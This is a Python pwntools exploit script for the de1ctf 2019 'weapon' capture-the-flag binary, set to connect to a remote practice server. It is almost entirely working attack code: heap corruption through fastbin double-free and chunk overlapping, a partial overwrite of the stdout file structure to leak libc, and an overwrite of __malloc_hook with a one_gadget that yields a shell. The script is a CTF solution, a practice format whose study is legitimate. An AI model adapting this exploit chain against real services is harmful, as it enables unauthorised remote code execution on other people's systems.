# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './de1ctf_2019_weapon'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29868'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

def add(size,idx,name):
    cmd(1)
    sla("size of weapon:",size)
    sla("index:",idx)
    sa("name:",name)

def delete(idx):
    cmd(2)
    sla("idx :",idx)

def edit(idx,content):
    cmd(3)
    sla("idx:",idx)
    sa("content:",content)

#one_gadget = [0x45206,0x4525a,0xef9f4,0xf0897]
one_gadget =  [0x45216,0x4526a,0xf02a4,0xf1147]

def to_pwn():

    add(0x18,"0","a"*8 + "\x21")
    add(0x60,"1","aaa")
    add(0x18,"2","aaa")
    add(0x18,"3","aaa")

    add(0x60,6,"aaa")
    add(0x60,7,"aaa")

    delete(0)
    delete(2)

    edit(2,"\x10")

    add(0x18,4,"aa")
    add(0x18,4,"\x00")

    delete(1)
    edit(4,"\x00"*0x8 + "\x91")
    delete(1)
    edit(4,"\x00"*0x8 + "\x71")

    low_addr = 0x95dd

    payload = "aaa" + "\x00"*0x30 + p64(0xfbad1800) + p64(0)*3 + "\x00"

    edit(1, p16(low_addr))
    add(0x60,5,payload)
    add(0x60,5,payload)

    _IO_2_1_stderr_ = l64() - 192
    libc.address = _IO_2_1_stderr_ - libc.sym["_IO_2_1_stderr_"]
    malloc_addr = libc.sym["__malloc_hook"]
    gadget = one_gadget[3]  + libc.address
    delete(6)
    delete(7)

    edit(7,p64(malloc_addr - 0x23))

    add(0x60,8,"aa")

    payload = "\x00"*0x13 + p64(gadget)
    add(0x60,8,payload)
    
    cmd(1)
    sla("size of weapon:",0x20)
    sla("index:",1)

    p.interactive()

while 1:
    try:
        to_pwn()
    except:
        p.close()
        #p = process(binary)
        p = remote(host,port)
        continue

'''
@File    :   de1ctf_2019_weapon.py
@Time    :   2021/07/24 21:17:01
@Author  :   Niyah 
'''